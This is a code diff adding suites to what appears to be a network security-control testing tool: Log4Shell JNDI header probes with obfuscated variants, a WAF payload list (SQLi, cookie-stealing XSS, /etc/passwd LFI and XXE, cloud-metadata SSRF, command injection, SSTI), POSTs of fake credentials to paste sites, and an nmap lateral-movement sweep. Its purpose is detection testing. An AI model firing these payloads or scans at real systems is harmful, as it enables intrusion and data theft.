@@ -247,6 +247,8 @@ _SUITE_DESCRIPTIONS: list[tuple[str, str]] = [
     ("icmp",             "Ping + traceroute to a set of remote hosts"),
     ("ids-trigger",      "16 Snort/Suricata signatures: scanner UAs + web-attack URL probes → testmyids.com"),
     ("kyber",            "HTTPS HEAD with X25519MLKEM768 post-quantum curves"),
+    ("lateral-movement", "Ping sweep /24 subnet + nmap lateral-movement ports (SSH/SMB/RDP/WMI/LDAP/Kerberos)"),
+    ("log4shell",        "Log4Shell JNDI header injection probes (CVE-2021-44228) → IDS/WAF/SASE"),
     ("malware-agents",   "HEAD requests to malware-category URLs using C2 framework user-agents (SASE/NGFW)"),
     ("malware-download", "Download known-malware file samples (to /dev/null)"),
     ("metasploit-check", "Run Metasploit .rc check scripts (no exploitation)"),
@@ -255,12 +257,16 @@ _SUITE_DESCRIPTIONS: list[tuple[str, str]] = [
     ("ntp",              "NTP UDP probes to a pool of public time servers"),
     ("phishing-domains", "Probe random samples from active phishing domain list"),
     ("pornography",      "HTTPS crawl of adult-content endpoints"),
+    ("shadow-it",        "HEAD requests to unsanctioned cloud apps (Dropbox/MEGA/Discord/Telegram/Crypto) — CASB app-control"),
     ("snmp",             "SNMPv1/v2c/v3 walks with common community strings and credentials"),
     ("squatting",        "dnstwist typosquatting generation for popular domains"),
     ("s3",               "S3 upload/download simulation: GET public objects + PUT synthetic DLP payloads"),
     ("ssh",              "Non-interactive SSH connection attempts"),
+    ("tor-anonymizer",   "HEAD requests to Tor/VPN/proxy sites → URL-filter anonymizer category"),
     ("url-response",     "Measure HTTPS response times via requests library"),
     ("virus",            "Download known-virus samples (to /dev/null)"),
+    ("waf-attack",       "SQLi/XSS/LFI/SSRF/CMDi/XXE/SSTI payloads in query params and POST bodies → WAF inline"),
+    ("data-exfil-http",  "POST synthetic PII/credentials to paste sites → DLP + CASB outbound inspection"),
     ("web-scanner",      "Nikto web vulnerability scan"),
     ("all",              "Run every suite above in random order"),
 ]
@@ -795,6 +801,7 @@ def _popen_kill_group(cmd: str, timeout: int,
 _SUITE_TIMEOUTS: dict[str, int] = {
     "metasploit_check":   360,
     "web_scanner":        300,
+    "lateral_movement_sim": 480,
     "nmap_1024os":        210,
     "nmap_cve":           210,
     "bigfile":            180,
@@ -3024,6 +3031,405 @@ def scrape_iterative(base_url: str, iterations: int = 3) -> None:
 
 
 # ══════════════════════════════════════════════════════════════════════════════
+# NEW DETECTION SUITES
+# ══════════════════════════════════════════════════════════════════════════════
+
+def log4shell_probe() -> None:
+    """
+    Inject Log4Shell (CVE-2021-44228) JNDI payloads into common HTTP request
+    headers targeting testmyids.com and OWASP Juice Shop.
+
+    Headers exercised: User-Agent, X-Api-Version, X-Forwarded-For, Referer,
+    Authorization, X-Custom-IP-Authorization.  Payloads use LDAP, RMI and DNS
+    lookup vectors (${jndi:ldap://...}, ${jndi:rmi://...}, ${jndi:dns://...}).
+
+    Detects whether:
+      • IDS/IPS has Suricata SID 2034907/2034908 (ET EXPLOIT Log4j)
+      • WAF (Cloudflare, AWS WAF, F5, Imperva) blocks JNDI in headers
+      • SASE inline inspection catches the exploit pattern in HTTP headers
+    """
+    _JNDI_VARIANTS = [
+        "${jndi:ldap://log4shell.test/exploit}",
+        "${jndi:ldap://log4shell-test.com/a}",
+        "${jndi:rmi://log4shell.test/exploit}",
+        "${jndi:dns://log4shell.test/a}",
+        "${${lower:j}ndi:${lower:l}dap://log4shell.test/exploit}",
+        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4shell.test/a}",
+    ]
+    _HEADERS = [
+        "User-Agent",
+        "X-Api-Version",
+        "X-Forwarded-For",
+        "Referer",
+        "Authorization",
+        "X-Custom-IP-Authorization",
+    ]
+    targets = ["http://www.testmyids.com", "https://juice-shop.herokuapp.com"]
+    probes = []
+    for target in targets:
+        for header in _HEADERS:
+            payload = random.choice(_JNDI_VARIANTS)
+            probes.append((f"{header} → {target}", target, header, payload))
+
+    ui_banner("Log4Shell Probe", f"{len(probes)} header injections (CVE-2021-44228)")
+    ok_count = 0
+    for label, url, header, payload in probes:
+        try:
+            console.log(f"  {header:<30}  {url}")
+            result = subprocess.run(
+                ["curl", "-k", "-s", "--show-error", "--connect-timeout", "3",
+                 "-I", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "5",
+                 "-H", f"{header}: {payload}", url],
+                capture_output=True, text=True, timeout=10,
+            )
+            status = result.stdout.strip()
+            console.log(f"    ↳ [{_status_style(status)}]HTTP {status}[/]  payload={payload[:40]}")
+            _stats.record(status)
+            ok_count += 1
+        except Exception as e:
+            _stats.fail()
+            console.log(f"    ↳ [yellow]error: {e}[/]")
+        time.sleep(random.uniform(0.3, 0.7))
+    ui_ok(f"Log4Shell probe complete  ({ok_count}/{len(probes)} sent)")
+
+
+def shadow_it() -> None:
+    """
+    HEAD requests to unsanctioned cloud applications that CASB / SSE platforms
+    (Zscaler, Netskope, Cato, Prisma) classify as personal file sharing,
+    personal messaging, crypto, or shadow IT.
+
+    This exercises app-control policies on CASB/SSE platforms.  No data is
+    uploaded — only HEAD requests are made to test URL-category and
+    app-identification rules.  Destinations include: Dropbox, Box, MEGA,
+    WeTransfer, Discord, Telegram, WhatsApp Web, ProtonMail, Pastebin,
+    Coinbase, Notion, and similar.
+    """
+    n = _size_to_limits(ARGS.size, 10, len(shadow_it_endpoints), len(shadow_it_endpoints),
+                        len(shadow_it_endpoints))
+    ui_banner("Shadow IT / Unsanctioned Apps",
+              f"{n} HEAD requests → CASB app-control categories")
+    try:
+        random.shuffle(shadow_it_endpoints)
+        _run_head_batch(shadow_it_endpoints[:n], "SHADOW-IT", user_agents,
+                        connect_timeout=4, max_time=8)
+        ui_ok("Shadow IT sweep complete")
+    except Exception as e:
+        _stats.fail()
+        ui_error(f"[shadow_it] {e}")
+
+
+def data_exfil_http() -> None:
+    """
+    POST synthetic PII and credential payloads to public paste / file-drop
+    services (Pastebin, Hastebin, transfer.sh, etc.).
+
+    The POST bodies contain patterns that DLP content-inspection engines and
+    CASB platforms are trained to detect:
+      • US Social Security Numbers  (nnn-nn-nnnn)
+      • Payment card numbers (Luhn-valid 16-digit patterns)
+      • Private key / credential blocks
+      • Email + password combination lists
+
+    All destinations will reject the POST (403/422/redirect), but the outbound
+    HTTP request and its body are visible to inline DLP and CASB.  No real PII
+    is sent.
+    """
+    _PII_TEMPLATES = [
+        ("ssn_list",     "Name: John Doe\nSSN: 123-45-6789\nDOB: 1985-03-14\nAddress: 123 Main St"),
+        ("cc_data",      "CardNumber: 4532015112830366\nExpiry: 12/26\nCVV: 123\nName: Jane Smith"),
+        ("credentials",  "username: admin\npassword: P@ssw0rd123!\napi_key: sk-live-xG9aB2cD3eF4g5H"),
+        ("private_key",  "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...(fake)...\n-----END RSA PRIVATE KEY-----"),
+        ("pw_dump",      "admin:$2b$12$fakehashedpassword1234567\nroot:$2b$12$fakehashedpassword7654321"),
+        ("pii_csv",      "first,last,ssn,email\nAlice,Smith,234-56-7890,alice@corp.com\nBob,Jones,345-67-8901,bob@corp.com"),
+    ]
+
+    n = _size_to_limits(ARGS.size, 3, 6, len(data_exfil_targets), len(data_exfil_targets))
+    random.shuffle(data_exfil_targets)
+    targets = data_exfil_targets[:n]
+
+    ui_banner("HTTP Data Exfil Simulation", f"{n} POSTs with synthetic PII/credential payloads")
+    ok_count = 0
+    for i, url in enumerate(targets, 1):
+        label, body = random.choice(_PII_TEMPLATES)
+        ua = random.choice(user_agents)
+        console.log(f"  ({i}/{n}) POST {url}  payload={label}")
+        try:
+            resp = requests.post(
+                url,
+                data={"content": body, "format": "text", "expiry": "10m"},
+                headers={"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded"},
+                timeout=6,
+                verify=False,
+                allow_redirects=False,
+            )
+            _stats.record(str(resp.status_code))
+            console.log(f"    ↳ [{_status_style(str(resp.status_code))}]HTTP {resp.status_code}[/]")
+            ok_count += 1
+        except requests.exceptions.ConnectionError as e:
+            if "refused" in str(e).lower() or "reset" in str(e).lower():
+                _stats.block()
+            else:
+                _stats.drop()
+            console.log(f"    ↳ [yellow]connection error: {e.__class__.__name__}[/]")
+        except requests.exceptions.Timeout:
+            _stats.drop()
+            console.log("    ↳ [yellow]timeout[/]")
+        except Exception as e:
+            _stats.fail()
+            console.log(f"    ↳ [yellow]error: {e}[/]")
+        time.sleep(random.uniform(0.5, 1.5))
+    ui_ok(f"HTTP exfil simulation complete  ({ok_count}/{n} sent)")
+
+
+def waf_attack() -> None:
+    """
+    Send HTTP requests with WAF-triggering payloads in URL query parameters
+    and POST bodies against intentionally-vulnerable / pen-test-authorised
+    web targets.
+
+    Attack categories:
+      • SQL injection  (Union-based, error-based, blind boolean)
+      • Cross-site scripting  (reflected, DOM)
+      • Local file inclusion  (../etc/passwd variants)
+      • Server-side request forgery  (internal metadata probes)
+      • OS command injection  (semicolon, pipe, backtick)
+      • XML external entity (XXE)
+      • Server-side template injection (SSTI)
+
+    Targets: OWASP Juice Shop, testmyids.com, hackazon, vulnweb.
+    All are public pen-test sandboxes that explicitly authorise this traffic.
+
+    Validates that WAF inline inspection (Cloudflare, F5 AWAF, Imperva,
+    AWS WAF, Palo Alto App-ID) fires on query-parameter and body payloads,
+    not just URL-path patterns (which ids-trigger already covers).
+    """
+    _ATTACKS = [
+        # SQL injection — query params
+        ("SQLi union",      "GET",  "{base}/?id=1'+UNION+SELECT+null,table_name,null+FROM+information_schema.tables--",   None),
+        ("SQLi error",      "GET",  "{base}/?id=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--",                          None),
+        ("SQLi blind",      "GET",  "{base}/?id=1'+AND+1=1--",                                                             None),
+        ("SQLi sleep",      "GET",  "{base}/?id=1';+WAITFOR+DELAY+'0:0:5'--",                                              None),
+        # XSS — reflected in params
+        ("XSS script",      "GET",  "{base}/?q=<script>alert(document.cookie)</script>",                                   None),
+        ("XSS img",         "GET",  "{base}/?name=<img+src=x+onerror=alert(1)>",                                           None),
+        ("XSS svg",         "GET",  "{base}/?s=<svg/onload=alert(1)>",                                                     None),
+        # LFI / path traversal
+        ("LFI etc/passwd",  "GET",  "{base}/?file=../../../../etc/passwd",                                                 None),
+        ("LFI win ini",     "GET",  "{base}/?page=....//....//....//windows/win.ini",                                      None),
+        # SSRF
+        ("SSRF metadata",   "GET",  "{base}/?url=http://169.254.169.254/latest/meta-data/",                                None),
+        ("SSRF localhost",  "GET",  "{base}/?redirect=http://127.0.0.1:8080/admin",                                        None),
+        # Command injection — POST body
+        ("CMDi semicolon",  "POST", "{base}/search",  {"q": "; cat /etc/passwd"}),
+        ("CMDi pipe",       "POST", "{base}/search",  {"q": "| whoami"}),
+        ("CMDi backtick",   "POST", "{base}/search",  {"q": "`id`"}),
+        # XXE — POST body (XML content-type)
+        ("XXE entity",      "POST", "{base}/api",
+         "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"),
+        # SSTI
+        ("SSTI Jinja2",     "GET",  "{base}/?name={{7*7}}",                                                                None),
+        ("SSTI Twig",       "GET",  "{base}/?tpl={{_self.env.registerUndefinedFilterCallback('exec')}}",                   None),
+    ]
+
+    n = _size_to_limits(ARGS.size, 8, len(_ATTACKS), len(_ATTACKS), len(_ATTACKS))
+    probes = random.sample(_ATTACKS, k=min(n, len(_ATTACKS)))
+    base = random.choice(waf_attack_targets).rstrip("/")
+
+    ui_banner("WAF Attack Simulation",
+              f"{len(probes)} payloads → {base}")
+    ok_count = 0
+    for label, method, path_tmpl, body in probes:
+        url = path_tmpl.replace("{base}", base)
+        ua  = random.choice(user_agents)
+        console.log(f"  {method:<4}  {label:<20}  {url[:80]}")
+        try:
+            if method == "GET":
+                result = subprocess.run(
+                    ["curl", "-k", "-s", "--show-error", "--connect-timeout", "4",
+                     "-I", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "6",
+                     "-A", ua, url],
+                    capture_output=True, text=True, timeout=12,
+                )
+                status = result.stdout.strip()
+                _stats.record(status)
+            else:
+                headers = {"User-Agent": ua}
+                if isinstance(body, str):
+                    headers["Content-Type"] = "application/xml"
+                    resp = requests.post(url, data=body, headers=headers,
+                                         timeout=6, verify=False, allow_redirects=False)
+                else:
+                    resp = requests.post(url, data=body or {}, headers=headers,
+                                         timeout=6, verify=False, allow_redirects=False)
+                status = str(resp.status_code)
+                _stats.record(status)
+            console.log(f"    ↳ [{_status_style(status)}]HTTP {status}[/]")
+            ok_count += 1
+        except Exception as e:
+            _stats.fail()
+            console.log(f"    ↳ [yellow]error: {e}[/]")
+        time.sleep(random.uniform(0.2, 0.6))
+    ui_ok(f"WAF attack simulation complete  ({ok_count}/{len(probes)} sent)")
+
+
+def tor_anonymizer() -> None:
+    """
+    HEAD requests to Tor Project, commercial VPN landing pages, and web-proxy
+    / anonymiser sites.
+
+    Every major NGFW, SASE, and DNS-filter vendor (Cisco Umbrella, Palo Alto,
+    Fortinet, Zscaler, Netskope) has a dedicated "anonymizers" or "proxy
+    avoidance" URL-filter category that covers these destinations.  Accessing
+    them tests whether the URL-filter policy is active and correctly applied.
+    """
+    n = _size_to_limits(ARGS.size, 8, len(tor_anonymizer_endpoints),
+                        len(tor_anonymizer_endpoints), len(tor_anonymizer_endpoints))
+    ui_banner("Tor / Anonymiser Probe",
+              f"{n} HEAD requests → anonymizer URL-filter category")
+    try:
+        random.shuffle(tor_anonymizer_endpoints)
+        _run_head_batch(tor_anonymizer_endpoints[:n], "ANON", user_agents,
+                        connect_timeout=4, max_time=8)
+        ui_ok("Tor/anonymiser probe complete")
+    except Exception as e:
+        _stats.fail()
+        ui_error(f"[tor_anonymizer] {e}")
+
+
+def lateral_movement_sim() -> None:
+    """
+    Simulate east-west lateral movement:
+
+      Phase 1 — Ping sweep (nmap -sn) the entire /24 containing the container's
+        default gateway to enumerate live hosts.
+      Phase 2 — Port scan every discovered host (up to 20) on common
+        lateral-movement ports:
+        22 (SSH), 88 (Kerberos), 135 (WMI/RPC), 137-139 (NetBIOS),
+        389 (LDAP), 445 (SMB), 636 (LDAPS), 3389 (RDP),
+        5985/5986 (WinRM HTTP/HTTPS).
+
+    Per-host outcomes are classified and recorded so the security dashboard
+    reflects actual firewall behaviour:
+      open ports       → ok()   (probe succeeded — no east-west firewall)
+      all ports closed → block()  (host reachable, ports actively rejected/RST)
+      all ports filtered → drop() (silently dropped — firewall blocking east-west)
+      nmap error       → fail()
+
+    Targets are RFC1918 space local to the container — no external hosts are
+    scanned.  Generates east-west NGFW alerts (Palo Alto, Fortinet), SIEM
+    lateral-movement correlation, and network IDS SMB/RDP recon signatures.
+    """
+    _LATERAL_PORTS = "22,88,135,137,138,139,389,445,636,3389,5985,5986"
+
+    # ── Detect default gateway and derive /24 subnet ─────────────────────────
+    try:
+        gw_result = subprocess.run(
+            ["ip", "route", "show", "default"],
+            capture_output=True, text=True, timeout=5,
+        )
+        gw_ip = None
+        for token in gw_result.stdout.split():
+            if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", token):
+                gw_ip = token
+                break
+        if not gw_ip:
+            ui_warn("lateral_movement_sim: cannot determine default gateway — skipping")
+            _stats.fail()
+            return
+        octets = gw_ip.split(".")
+        subnet = ".".join(octets[:3]) + ".0/24"
+    except Exception as e:
+        ui_warn(f"lateral_movement_sim: gateway detection failed: {e}")
+        _stats.fail()
+        return
+
+    ui_banner("Lateral Movement Simulation",
+              f"gateway={gw_ip}  subnet={subnet}  ports={_LATERAL_PORTS}")
+
+    # ── Phase 1: ping sweep ──────────────────────────────────────────────────
+    console.log(f"[cyan]Phase 1[/] ping sweep → {subnet}")
+    live_hosts: list[str] = []
+    try:
+        sweep = subprocess.run(
+            ["nmap", "-sn", "--send-ip", "-T4",
+             "--max-retries", "1", "--host-timeout", "10s",
+             "-oG", "-", subnet],
+            capture_output=True, text=True, timeout=240,
+        )
+        for line in sweep.stdout.splitlines():
+            if "Status: Up" in line:
+                m = re.search(r"Host:\s+(\d+\.\d+\.\d+\.\d+)", line)
+                if m:
+                    live_hosts.append(m.group(1))
+        console.log(f"  sweep done — {len(live_hosts)} live host(s): "
+                    f"{', '.join(live_hosts[:10]) or 'none'}")
+        _stats.ok()
+    except Exception as e:
+        console.log(f"[yellow]ping sweep error: {e}[/]")
+        _stats.fail()
+
+    # ── Phase 2: lateral-movement port scan ──────────────────────────────────
+    scan_targets = (live_hosts[:20] if live_hosts else [gw_ip])
+    console.log(f"[cyan]Phase 2[/] port scan {_LATERAL_PORTS} → "
+                f"{len(scan_targets)} target(s)")
+    total_open = 0
+    for i, host in enumerate(scan_targets, 1):
+        console.log(f"  ({i}/{len(scan_targets)}) scanning {host}")
+        try:
+            port_result = subprocess.run(
+                ["nmap", "-Pn", f"-p{_LATERAL_PORTS}", host, "-T4",
+                 "--max-retries", "0", "--host-timeout", "30s", "-oG", "-"],
+                capture_output=True, text=True, timeout=60,
+            )
+            open_ports:     list[str] = []
+            closed_ports:   list[str] = []
+            filtered_ports: list[str] = []
+            for line in port_result.stdout.splitlines():
+                # grepable: "Host: 10.0.0.1 ()  Ports: 22/closed/tcp//ssh///, 445/filtered/tcp//..."
+                if line.startswith("Host:") and "Ports:" in line:
+                    ports_raw = line.split("Ports:", 1)[1]
+                    for entry in ports_raw.split(","):
+                        parts = entry.strip().split("/")
+                        if len(parts) >= 2:
+                            port_num, state = parts[0], parts[1]
+                            if state == "open":
+                                open_ports.append(port_num)
+                            elif state == "closed":
+                                closed_ports.append(port_num)
+                            elif "filtered" in state:
+                                filtered_ports.append(port_num)
+
+            # Log per-host summary
+            summary_parts = []
+            if open_ports:
+                summary_parts.append(f"[red]open: {','.join(open_ports)}[/]")
+            if closed_ports:
+                summary_parts.append(f"[yellow]closed: {len(closed_ports)}[/]")
+            if filtered_ports:
+                summary_parts.append(f"[green]filtered: {len(filtered_ports)}[/]")
+            console.log(f"    ↳ {host}  " + ("  ".join(summary_parts) or "no ports info"))
+
+            total_open += len(open_ports)
+            if open_ports:
+                _stats.ok()       # probe reached open service — no east-west block
+            elif filtered_ports and not closed_ports:
+                _stats.drop()     # all silently dropped — firewall blocking east-west
+            elif closed_ports:
+                _stats.block()    # actively rejected (TCP RST from host or firewall)
+            else:
+                _stats.drop()     # host completely unreachable
+        except Exception as e:
+            console.log(f"[yellow]  port scan {host}: {e}[/]")
+            _stats.fail()
+        if i < len(scan_targets):
+            time.sleep(random.uniform(0.3, 1.0))
+
+    ui_ok(f"Lateral movement simulation complete  "
+          f"(subnet={subnet}  live={len(live_hosts)}  open_ports_found={total_open})")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
 # CLI & RUNNER
 # ══════════════════════════════════════════════════════════════════════════════
 
@@ -3049,6 +3455,8 @@ _SUITE_MAP: dict[str, list] = {
     "icmp":             [ping_random, traceroute_random],
     "ids-trigger":      [ips],
     "kyber":            [kyber_random],
+    "lateral-movement": [lateral_movement_sim],
+    "log4shell":        [log4shell_probe],
     "malware-agents":   [malware_random],
     "malware-download": [malware_download],
     "metasploit-check": [metasploit_check],
@@ -3057,12 +3465,16 @@ _SUITE_MAP: dict[str, list] = {
     "ntp":              [ntp_random],
     "phishing-domains": [github_phishing_domain_check],
     "pornography":      [pornography_crawl],
+    "shadow-it":        [shadow_it],
     "snmp":             [snmp_v1, snmp_v2c, snmp_v3],
     "s3":               [s3_sim],
     "squatting":        [squatting_domains],
     "ssh":              [ssh_random],
+    "tor-anonymizer":   [tor_anonymizer],
     "url-response":     [urlresponse_random],
     "virus":            [virus_sim],
+    "waf-attack":       [waf_attack],
+    "data-exfil-http":  [data_exfil_http],
     "web-scanner":      [web_scanner],
 }
 
